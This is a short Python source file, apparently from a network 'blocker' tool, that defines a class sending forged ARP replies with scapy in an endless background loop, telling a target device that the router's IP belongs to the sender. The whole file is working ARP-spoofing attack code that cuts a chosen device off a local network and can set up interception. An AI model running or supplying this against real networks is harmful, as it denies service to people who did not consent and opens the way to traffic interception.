import scapy.all as scapy
from src.device import Device
import threading


class Blocker():
    target: Device
    router: Device

    def __init__(self, router: Device, target: Device) -> None:
        self.target = target
        self.router = router

    def spoof(self):
        packet = scapy.ARP(pdst=self.target.ip,
                           hwdst=self.target.mac, psrc=self.router.ip, op=2)
        while True:
            scapy.send(packet, verbose=False)

    def start(self):
        t = threading.Thread(target=self.spoof)
        t.daemon = True
        t.start()
        print(f"\n[+] Started for {self.target}\n")
